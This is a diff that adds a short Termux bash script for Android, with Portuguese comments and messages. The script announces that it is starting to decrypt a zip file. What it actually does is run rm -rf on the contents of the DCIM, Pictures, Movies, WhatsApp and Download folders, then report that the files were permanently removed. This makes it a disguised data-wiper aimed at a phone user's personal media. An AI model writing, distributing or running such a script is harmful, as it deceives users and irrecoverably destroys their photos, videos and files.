@@ -1,0 +1,25 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Mensagem inicial
+echo "Descriptografação iniciando do arquivo zip"
+echo ""
+
+# Diretório do armazenamento interno
+BASE="/storage/emulated/0"
+
+# Lista das pastas padrão que queremos excluir arquivos
+PASTAS_PADRAO=("DCIM" "Pictures" "Movies" "WhatsApp" "Download")
+
+# Loop para remover arquivos dessas pastas
+for PASTA_NOME in "${PASTAS_PADRAO[@]}"; do
+    PASTA_PATH="$BASE/$PASTA_NOME"
+    if [ -d "$PASTA_PATH" ]; then
+        echo "Removendo arquivos da pasta: $PASTA_NOME"
+        rm -rf "${PASTA_PATH:?}"/*
+    else
+        echo "Pasta '$PASTA_NOME' não encontrada, pulando..."
+    fi
+done
+
+echo ""
+echo "Todos os arquivos das pastas padrão foram removidos permanentemente!"
